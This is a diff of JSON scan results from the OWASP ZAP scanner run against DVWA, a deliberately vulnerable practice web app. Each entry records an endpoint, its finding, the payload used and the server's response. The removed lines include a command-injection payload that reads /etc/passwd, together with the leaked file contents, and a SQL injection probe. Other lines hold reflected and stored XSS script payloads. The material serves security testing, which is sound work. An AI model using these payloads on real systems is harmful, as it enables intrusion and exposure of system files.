@@ -33,21 +33,6 @@
     },
     {
       "target": {
-        "endpoint": "vulnerabilities/exec/",
-        "method": "POST",
-        "inputVector": "form",
-        "param": "ip"
-      },
-      "findings": [
-        "Remote OS Command Injection [High/Medium]"
-      ],
-      "payloads": [
-        "test&cat /etc/passwd&"
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] root:x:0:0\n[Context] <input type=\"submit\" name=\"Submit\" value=\"Submit\"> </p> </form> <pre>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x"
-    },
-    {
-      "target": {
         "endpoint": "vulnerabilities/fi/?page=%2Fetc%2Fpasswd",
         "method": "GET",
         "inputVector": "querystring",
@@ -62,24 +47,6 @@
         "http://www.google.com/"
       ],
       "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] root:x:0:0\n[ZAP Evidence] <title>Google</title>\n[Context] root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x",
-      "repeat": 2
-    },
-    {
-      "target": {
-        "endpoint": "vulnerabilities/sqli/?=&Submit=Submit",
-        "method": "GET",
-        "inputVector": "querystring",
-        "param": "id"
-      },
-      "findings": [
-        "Parameter Tampering [Medium/Low]",
-        "SQL Injection - MySQL [High/Medium]"
-      ],
-      "payloads": [
-        "",
-        "'"
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] on line <b>\n[ZAP Evidence] You have an error in your SQL syntax\n[Context] array key \"id\" in <b>/var/www/html/DVWA/vulnerabilities/sqli/source/low.php</b> on line <b>5</b><br /> <!DOCTYPE html> <html lang=\"en-GB\"> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> <title>Vulnerabil\n[Reflection] put type=\"button\" value=\"View Help\" class=\"popup_button\" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=sqli&security",
       "repeat": 2
     },
     {
@@ -99,39 +66,33 @@
     },
     {
       "target": {
-        "endpoint": "vulnerabilities/view_source.php?id=%00&security=low",
+        "endpoint": "vulnerabilities/view_source.php?id=%3C%2Fh2%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Ch2%3E&security=low",
         "method": "GET",
         "inputVector": "querystring",
         "param": "id"
       },
       "findings": [
-        "Parameter Tampering [Medium/Low]",
         "Cross Site Scripting (Reflected) [High/Medium]"
       ],
       "payloads": [
-        "\u0000",
         "</h2><scrIpt>alert(1);</scRipt><h2>"
       ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\n\n[ZAP Evidence] on line <b>\n[ZAP Evidence] </h2><scrIpt>alert(1);</scRipt><h2>\n[Context] #1 {main} thrown in <b>/var/www/html/DVWA/vulnerabilities/view_source.php</b> on line <b>63</b><br />",
-      "repeat": 2
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </h2><scrIpt>alert(1);</scRipt><h2>\n[Context] body_padded\"> <h1>Unknown Vulnerability Source</h1> <h2>vulnerabilities/</h2><scrIpt>alert(1);</scRipt><h2>/source/low.php</h2> <div id=\"code\"> <table width='100%' bgcolor='white' style=\"border:2px #C0C0C0 solid\"> <tr> <td><div id=\"code\"><"
     },
     {
       "target": {
-        "endpoint": "vulnerabilities/view_source.php?id=xss_s&security=%00",
+        "endpoint": "vulnerabilities/view_source.php?id=xss_s&security=%3C%2Fh2%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Ch2%3E",
         "method": "GET",
         "inputVector": "querystring",
         "param": "security"
       },
       "findings": [
-        "Parameter Tampering [Medium/Low]",
         "Cross Site Scripting (Reflected) [High/Medium]"
       ],
       "payloads": [
-        "\u0000",
         "</h2><scrIpt>alert(1);</scRipt><h2>"
       ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\n\n[ZAP Evidence] on line <b>\n[ZAP Evidence] </h2><scrIpt>alert(1);</scRipt><h2>\n[Context] #1 {main} thrown in <b>/var/www/html/DVWA/vulnerabilities/view_source.php</b> on line <b>63</b><br />",
-      "repeat": 2
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </h2><scrIpt>alert(1);</scRipt><h2>\n[Context] dy_padded\"> <h1>Stored XSS Source</h1> <h2>vulnerabilities/xss_s/source/</h2><scrIpt>alert(1);</scRipt><h2>.php</h2> <div id=\"code\"> <table width='100%' bgcolor='white' style=\"border:2px #C0C0C0 solid\"> <tr> <td><div id=\"code\"><pre><code s"
     },
     {
       "target": {
@@ -171,15 +132,12 @@
         "param": "mtxMessage"
       },
       "findings": [
-        "Parameter Tampering [Medium/Low]",
         "Cross Site Scripting (Reflected) [High/Medium]"
       ],
       "payloads": [
-        "",
         "</div><scrIpt>alert(1);</scRipt><div>"
       ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] on line <b>\n[ZAP Evidence] </div><scrIpt>alert(1);</scRipt><div>\n[Context] \"mtxMessage\" in <b>/var/www/html/DVWA/vulnerabilities/xss_s/source/low.php</b> on line <b>5</b><br /> <!DOCTYPE html> <html lang=\"en-GB\"> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> <title>Vulnerabil",
-      "repeat": 2
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </div><scrIpt>alert(1);</scRipt><div>\n[Context] 5pz4p<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: </div><scrIpt>alert(1);</scRipt><div><br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: test<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Na"
     },
     {
       "target": {
@@ -189,75 +147,12 @@
         "param": "txtName"
       },
       "findings": [
-        "Parameter Tampering [Medium/Low]",
         "Cross Site Scripting (Reflected) [High/Medium]"
       ],
       "payloads": [
-        "",
         "</div><scrIpt>alert(1);</scRipt><div>"
       ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] on line <b>\n[ZAP Evidence] </div><scrIpt>alert(1);</scRipt><div>\n[Context] key \"txtName\" in <b>/var/www/html/DVWA/vulnerabilities/xss_s/source/low.php</b> on line <b>6</b><br /> <!DOCTYPE html> <html lang=\"en-GB\"> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> <title>Vulnerabil",
-      "repeat": 2
-    },
-    {
-      "target": {
-        "endpoint": "hackable/",
-        "method": "GET",
-        "inputVector": "",
-        "param": ""
-      },
-      "findings": [
-        "Directory Browsing [Medium/Medium]"
-      ],
-      "payloads": [
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\n\n[ZAP Evidence] <title>Index of /DVWA/hackable</title>\n[Context] <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <html> <head> <title>Index of /DVWA/hackable</title> </head> <body> <h1>Index of /DVWA/hackable</h1> <table> <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O="
-    },
-    {
-      "target": {
-        "endpoint": "hackable/flags/",
-        "method": "GET",
-        "inputVector": "",
-        "param": ""
-      },
-      "findings": [
-        "Directory Browsing [Medium/Medium]"
-      ],
-      "payloads": [
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\n\n[ZAP Evidence] <title>Index of /DVWA/hackable/flags</title>\n[Context] <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <html> <head> <title>Index of /DVWA/hackable/flags</title> </head> <body> <h1>Index of /DVWA/hackable/flags</h1> <table> <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?"
-    },
-    {
-      "target": {
-        "endpoint": "hackable/uploads/",
-        "method": "GET",
-        "inputVector": "",
-        "param": ""
-      },
-      "findings": [
-        "Directory Browsing [Medium/Medium]"
-      ],
-      "payloads": [
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\n\n[ZAP Evidence] <title>Index of /DVWA/hackable/uploads</title>\n[Context] <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <html> <head> <title>Index of /DVWA/hackable/uploads</title> </head> <body> <h1>Index of /DVWA/hackable/uploads</h1> <table> <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href="
-    },
-    {
-      "target": {
-        "endpoint": "hackable/users/",
-        "method": "GET",
-        "inputVector": "",
-        "param": ""
-      },
-      "findings": [
-        "Directory Browsing [Medium/Medium]"
-      ],
-      "payloads": [
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\n\n[ZAP Evidence] <title>Index of /DVWA/hackable/users</title>\n[Context] <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <html> <head> <title>Index of /DVWA/hackable/users</title> </head> <body> <h1>Index of /DVWA/hackable/users</h1> <table> <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?"
+      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </div><scrIpt>alert(1);</scRipt><div>\n[Context] 5pz4p<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: </div><scrIpt>alert(1);</scRipt><div><br />Message: test content<br /></div> <br /> <h2>More Information</h2> <ul> <li><a href=\"https://owasp.org/www-community/attacks/xss\" ta"
     },
     {
       "target": {
@@ -276,124 +171,6 @@
     },
     {
       "target": {
-        "endpoint": "vulnerabilities/captcha/",
-        "method": "GET",
-        "inputVector": "",
-        "param": ""
-      },
-      "findings": [
-        "Sub Resource Integrity Attribute Missing [Medium/High]"
-      ],
-      "payloads": [
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <script src='https://www.google.com/recaptcha/api.js'></script>\n[Context] <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\"><br /> <script src='https://www.google.com/recaptcha/api.js'></script> <br /> <div class='g-recaptcha' data-theme='dark' data-sitekey=''></div> <br /> <input type=\"submit\" value=\"Change\" name=\"Change\"> <"
-    },
-    {
-      "target": {
-        "endpoint": "vulnerabilities/captcha/",
-        "method": "POST",
-        "inputVector": "",
-        "param": ""
-      },
-      "findings": [
-        "Application Error Disclosure [Medium/Medium]",
-        "Sub Resource Integrity Attribute Missing [Medium/High]"
-      ],
-      "payloads": [
-        "",
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <b>Warning</b>:  Undefined array key \"g-recaptcha-response\" in <b>/var/www/html/DVWA/vulnerabilities/captcha/source/low.php</b> on line <b>14</b><br />\n[ZAP Evidence] <script src='https://www.google.com/recaptcha/api.js'></script>\n[Context] <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\"><br /> <script src='https://www.google.com/recaptcha/api.js'></script> <br /> <div class='g-recaptcha' data-theme='dark' data-sitekey=''></div> <br /> <input type=\"submit\" value=\"Change\" name=\"Change\"> <",
-      "repeat": 2
-    },
-    {
-      "target": {
-        "endpoint": "vulnerabilities/captcha/",
-        "method": "POST",
-        "inputVector": "form",
-        "param": "password_conf"
-      },
-      "findings": [
-        "Parameter Tampering [Medium/Low]"
-      ],
-      "payloads": [
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] on line <b>\n[Context] sword_conf\" in <b>/var/www/html/DVWA/vulnerabilities/captcha/source/low.php</b> on line <b>9</b><br /> <br /> <b>Warning</b>: Undefined array key \"g-recaptcha-response\" in <b>/var/www/html/DVWA/vulnerabilities/captcha/source/low.php</b> on"
-    },
-    {
-      "target": {
-        "endpoint": "vulnerabilities/captcha/",
-        "method": "POST",
-        "inputVector": "form",
-        "param": "password_new"
-      },
-      "findings": [
-        "Parameter Tampering [Medium/Low]"
-      ],
-      "payloads": [
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] on line <b>\n[Context] ssword_new\" in <b>/var/www/html/DVWA/vulnerabilities/captcha/source/low.php</b> on line <b>8</b><br /> <br /> <b>Warning</b>: Undefined array key \"g-recaptcha-response\" in <b>/var/www/html/DVWA/vulnerabilities/captcha/source/low.php</b> on"
-    },
-    {
-      "target": {
-        "endpoint": "vulnerabilities/captcha/",
-        "method": "POST",
-        "inputVector": "form",
-        "param": "step"
-      },
-      "findings": [
-        "Parameter Tampering [Medium/Low]"
-      ],
-      "payloads": [
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] on line <b>\n[Context] key \"step\" in <b>/var/www/html/DVWA/vulnerabilities/captcha/source/low.php</b> on line <b>3</b><br /> <br /> <b>Warning</b>: Undefined array key \"step\" in <b>/var/www/html/DVWA/vulnerabilities/captcha/source/low.php</b> on line <b>45</b><b"
-    },
-    {
-      "target": {
-        "endpoint": "vulnerabilities/csp/",
-        "method": "POST",
-        "inputVector": "",
-        "param": "Content-Security-Policy"
-      },
-      "findings": [
-        "CSP: Failure to Define Directive with No Fallback [Medium/High]",
-        "CSP: Wildcard Directive [Medium/High]",
-        "CSP: style-src unsafe-inline [Medium/High]"
-      ],
-      "payloads": [
-        "",
-        "",
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;",
-      "repeat": 3
-    },
-    {
-      "target": {
-        "endpoint": "vulnerabilities/csp/",
-        "method": "GET",
-        "inputVector": "",
-        "param": "Content-Security-Policy"
-      },
-      "findings": [
-        "CSP: Failure to Define Directive with No Fallback [Medium/High]",
-        "CSP: Wildcard Directive [Medium/High]",
-        "CSP: style-src unsafe-inline [Medium/High]"
-      ],
-      "payloads": [
-        "",
-        "",
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;",
-      "repeat": 3
-    },
-    {
-      "target": {
         "endpoint": "vulnerabilities/upload/",
         "method": "POST",
         "inputVector": "",
@@ -406,36 +183,6 @@
         ""
       ],
       "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <b>Warning</b>:  Undefined array key \"uploaded\" in <b>/var/www/html/DVWA/vulnerabilities/upload/source/low.php</b> on line <b>6</b><br />"
-    },
-    {
-      "target": {
-        "endpoint": "vulnerabilities/captcha/",
-        "method": "GET",
-        "inputVector": "",
-        "param": "https://www.google.com/recaptcha/api.js"
-      },
-      "findings": [
-        "Cross-Domain JavaScript Source File Inclusion [Low/Medium]"
-      ],
-      "payloads": [
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <script src='https://www.google.com/recaptcha/api.js'></script>\n[Context] <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\"><br /> <script src='https://www.google.com/recaptcha/api.js'></script> <br /> <div class='g-recaptcha' data-theme='dark' data-sitekey=''></div> <br /> <input type=\"submit\" value=\"Change\" name=\"Change\"> <"
-    },
-    {
-      "target": {
-        "endpoint": "vulnerabilities/captcha/",
-        "method": "POST",
-        "inputVector": "",
-        "param": "https://www.google.com/recaptcha/api.js"
-      },
-      "findings": [
-        "Cross-Domain JavaScript Source File Inclusion [Low/Medium]"
-      ],
-      "payloads": [
-        ""
-      ],
-      "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <script src='https://www.google.com/recaptcha/api.js'></script>\n[Context] <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\"><br /> <script src='https://www.google.com/recaptcha/api.js'></script> <br /> <div class='g-recaptcha' data-theme='dark' data-sitekey=''></div> <br /> <input type=\"submit\" value=\"Change\" name=\"Change\"> <"
     }
   ]
 }
